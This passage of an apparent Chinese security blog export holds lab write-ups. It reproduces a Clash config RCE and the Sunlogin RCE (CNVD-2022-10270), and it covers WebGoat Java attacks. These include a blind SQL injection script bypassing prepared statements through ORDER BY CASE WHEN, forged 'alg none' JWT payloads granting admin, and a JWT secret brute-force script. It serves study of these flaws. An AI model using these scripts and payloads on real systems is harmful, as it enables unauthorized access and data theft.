class="string">-8ff8-b1dbd032948f</span></span><br></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301230010284.png" alt="image-20220301230010284"></p><p>命令执行成功</p><p>由此看来这个漏洞有些鸡肋属于<code>self-xss</code>但是要知道Clash的配置文件大部分都是从代理url下载而来，这样以来危险也就由之而来，一些心存心存恶念的人提供一些免费的代理导致贪图便宜的兄弟中招，也就是常见的钓鱼</p><p>并且大部分人使用Clash不会去详细看yml文件，直接下载下来使用最后中招。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>将Clash更新到最新版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵 RCE复现</title>
      <link href="/posts/35386fe0/"/>
      <url>/posts/35386fe0/</url>
      
        <content type="html"><![CDATA[<h1 id="Sunlogin-RCE复现-CNVD-2022-10270"><a href="#Sunlogin-RCE复现-CNVD-2022-10270" class="headerlink" title="Sunlogin RCE复现(CNVD-2022-10270)"></a>Sunlogin RCE复现(CNVD-2022-10270)</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270">https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270</a></p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>windows 个人版 V11.0.0.33 V10.3.0.27372 V11.0.0.33162</p><p>简约版 V1.0.1.43315</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Mr-xn/sunlogin_rce/releases">Releases · Mr-xn&#x2F;sunlogin_rce (github.com)</a></p><p>使用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h 指定目标</span><br><span class="line"></span><br><span class="line">-t 选择扫描或者命令执行 默认scan</span><br><span class="line"></span><br><span class="line">-p 设置扫描端口范围 默认40000到65535</span><br><span class="line"></span><br><span class="line">-c 需要执行的命令</span><br></pre></td></tr></table></figure><p><img src="/posts/35386fe0/j3qNXASt5GWPMpB.png" alt="image-20220515223200470"></p><p><img src="/posts/35386fe0/qkTbI1ZLEyu2lHM.png" alt="image-20220515223216200"></p><p>经测试好像只有本机利用才会有回显</p><p><img src="/posts/35386fe0/xsfCZyJtE1L2ilj.png" alt="image-20220515223628294"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全-JWT安全及预编译 CASE 注入</title>
      <link href="/posts/43f09137/"/>
      <url>/posts/43f09137/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA安全-JWT-安全及预编译-CASE-注入"><a href="#JAVA安全-JWT-安全及预编译-CASE-注入" class="headerlink" title="JAVA安全-JWT 安全及预编译 CASE 注入"></a>JAVA安全-JWT 安全及预编译 CASE 注入</h1><h2 id="JAVA中的sql注入"><a href="#JAVA中的sql注入" class="headerlink" title="JAVA中的sql注入"></a>JAVA中的sql注入</h2><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection(mitigation)"></a>SQL Injection(mitigation)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;&#x27;&quot; +</span></span><br><span class="line">session.getAttribute(<span class="string">&quot;UserID&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数绑定方式，利用了 sql 的预编译技术</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE last_name = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">statement.setString(<span class="number">1</span>, accountName);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。</span><br><span class="line"></span><br><span class="line">如参数绑定方式可以使用下面方式绕过。</span><br><span class="line">通过使用 <span class="keyword">case</span> when 语句可以将 order by 后的 orderExpression 表达式中添加 select 语句。（前提是必须存在order by）</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/klyjb/p/11473857.html">JDBC编程之预编译SQL与防注入 - 加了冰的才叫可乐 - 博客园 (cnblogs.com)</a></p><h3 id="Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）"><a href="#Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）" class="headerlink" title="Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）"></a>Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）</h3><p><img src="/posts/43f09137/image-20220204205002145.png" alt="image-20220204205002145"></p><p>点击ip排序</p><p><img src="/posts/43f09137/image-20220204205222142.png" alt="image-20220204205222142"></p><p>将column参数随便改下看下报错</p><p>返回包中发现orderby可以使用case when 绕过</p><p><img src="/posts/43f09137/image-20220204210343988.png" alt="image-20220204210343988"></p><p>使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">chars = digits + <span class="string">&quot;.&quot;</span></span><br><span class="line">data1 = <span class="string">&quot;username_reg=tomx&#x27;+union+select+password+from+sql_challenge_users+where+userid%3D&#x27;teom&#x27;--+-&amp;email_reg=7702%40qq.com&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;lCNtTT1xRD0U-7U8zcjIbyRXzLH_DAvz7jGuMvj0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class="string">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8888&quot;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        vul_url = <span class="string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class="line">        <span class="comment"># print(resp.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;webgoat-prd&#x27;</span> <span class="keyword">in</span> resp.json()[<span class="number">0</span>][<span class="string">&#x27;hostname&#x27;</span>]:</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> temp == result:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/43f09137/image-20220204211625244.png" alt="image-20220204211625244"></p><h2 id="什么是-JWT？"><a href="#什么是-JWT？" class="headerlink" title="什么是 JWT？"></a>什么是 JWT？</h2><blockquote><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改</p></blockquote><p><img src="/posts/43f09137/image-20220205224641299.png" alt="image-20220205224641299"></p><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。JWT 的内容以 Base64URL 进行了编码。签名在base64加密前使用密钥加密</p><p><img src="/posts/43f09137/image-20220205110312210.png" alt="image-20220205110312210"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">头部（Header）</span><br><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">alg是说明这个JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256表示 HMAC SHA256。</span><br><span class="line">typ说明这个 token 的类型为 JWT</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">声明（Claims）</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1416471934</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;user_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;read&quot;</span><span class="punctuation">,</span> <span class="string">&quot;write&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;authorities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;ROLE_ADMIN&quot;</span><span class="punctuation">,</span> <span class="string">&quot;ROLE_USER&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;client_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-client-with-secret&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">JWT 固定参数有： </span><br><span class="line">iss： 发 行 人 </span><br><span class="line">exp： 到 期 时 间 </span><br><span class="line">sub： 主 题   </span><br><span class="line">aud： 用 户    </span><br><span class="line">nbf：在此之前不可用iat：发布时间</span><br><span class="line">jti：JWT ID 用于标识该 JWT</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">签名（Signature）</span><br><span class="line">服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。</span><br><span class="line">下面是一个用 HS256 生成 JWT 的代码例子</span><br><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="punctuation">,</span>secret)</span><br></pre></td></tr></table></figure><p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>6、服务器返回响应</p><p><img src="/posts/43f09137/image-20220205111357736.png" alt="image-20220205111357736"></p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-修改伪造攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 修改伪造攻击（WebGoat靶场）</h4><p>#了解 JWT 传输过程，验证机制</p><p>#了解 JWT 结构，加解密过程及注意事项</p><p><img src="/posts/43f09137/image-20220205111928593.png" alt="image-20220205111928593"></p><p><img src="/posts/43f09137/image-20220205112844469.png" alt="image-20220205112844469"></p><p>点击切换用户</p><p><img src="/posts/43f09137/image-20220205112926183.png" alt="image-20220205112926183"></p><p>抓包</p><p><img src="/posts/43f09137/image-20220205112938904.png" alt="image-20220205112938904"></p><p>发现access_token值为空</p><p>再点击删除键</p><p><img src="/posts/43f09137/image-20220205113051705.png" alt="image-20220205113051705"></p><p><img src="/posts/43f09137/image-20220205113106249.png" alt="image-20220205113106249"></p><p>数据包中发现access_token值</p><p>到<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>解密看下</p><p><img src="/posts/43f09137/image-20220205114647600.png" alt="image-20220205114647600"></p><p>发现”admin”: “false”,改为true就是管理员权限</p><p>但是这样还不行 我们的签名部分无法修改</p><p>注意：</p><p>问题来了，因为 JWT 的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好~修改头部为 None</p><p>我们无法获取到密钥也就无法更改签名 那么我们就修改头部文件”alg”:”HS256”改为”alg”:”none”</p><p><img src="/posts/43f09137/image-20220205120229198.png" alt="image-20220205120229198"></p><p><img src="/posts/43f09137/image-20220205120509791.png" alt="image-20220205120509791"></p><p>签名部分我们采用不加密也就是要留空</p><p>在 HTTP 传输过程中，Base64 编码中的”&#x3D;”,”+”,”&#x2F;“等特殊符号通过 URL 解码通常容易产生歧义，因此产生了与 URL 兼容的 Base64 URL 编码</p><p>也就是jwt在传输的时候要删掉这些符号</p><p>最后结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNjQ0ODk1ODIyLAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.</span><br></pre></td></tr></table></figure><p>完成</p><p>再把这串编码拿到burp中修改</p><p>攻击成功前提条件：服务器端没有验证是否有签名</p><h4 id="Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT-密钥爆破攻击（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205171436379.png" alt="image-20220205171436379"></p><p>JWT cracking——爆破，需要使用python脚本进行爆破，前提需自备字典。字典够强，就可以跑出来——<a href="https://wws.lanzous.com/icZOyfpz24b"><a href="https://lanzoux.com/icZOyfpz24b">m0re.txt - 蓝奏云 (lanzoux.com)</a></a><br>可以用我现在用的这个试试。测试呢嘛，就直接在源码里找到密码插进去就行。</p><p>注意需要pip安装PyJWT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = <span class="string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0NDA1ODU2MCwiZXhwIjoxNjQ0MDU4NjIwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OaUiWkNbWlZ2I1owqEeGX1DXTBw3ZRH-Yf3GOX1mXtc&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;‪C:\\Users\\FATBOY\\Desktop\\m0re.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! nothing be found.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/43f09137/image-20220205185622947.png" alt="image-20220205185622947"></p><p>脚本跑出来密匙为 <strong>business</strong></p><p>继续去<a href="https://jwt.io/%E8%A7%A3%E5%AF%86">https://jwt.io/解密</a></p><p><img src="/posts/43f09137/image-20220205185819944.png" alt="image-20220205185819944"></p><p><img src="/posts/43f09137/image-20220205205823502.png" alt="image-20220205205823502"></p><h4 id="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205214813724-16440688965541.png" alt="image-20220205214813724"></p><p><img src="/posts/43f09137/image-20220205214855195-16440689380832.png" alt="image-20220205214855195"></p><p>查看日志</p><p><img src="/posts/43f09137/image-20220205214912474.png" alt="image-20220205214912474"></p><p>发现token解密下</p><p><img src="/posts/43f09137/image-20220205214949819-16440689920343.png" alt="image-20220205214949819"></p><p>更改失效时间</p><p><img src="/posts/43f09137/image-20220205215204437.png" alt="image-20220205215204437"></p><p>使用第四关绕过签名的方法</p><p><img src="/posts/43f09137/image-20220205215938396.png" alt="image-20220205215938396"></p><p><img src="/posts/43f09137/image-20220205215912616.png" alt="image-20220205215912616"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNTI2MTMxNDExLAogICJleHAiOiAxNjQ0MDc5MTAzLAogICJhZG1pbiI6ICJmYWxzZSIsCiAgInVzZXIiOiAiVG9tIgp9.</span><br></pre></td></tr></table></figure><p>点击checkout抓包</p><p><img src="/posts/43f09137/image-20220205215549153.png" alt="image-20220205215549153"></p><p>更改数据</p><p><img src="/posts/43f09137/image-20220205215817789-16440695032324.png" alt="image-20220205215817789"></p><h4 id="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）</h4><p>参考：<a href="https://www.freebuf.com/vuls/216457.html">Java代码审计入门：WebGoat8（再会） - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
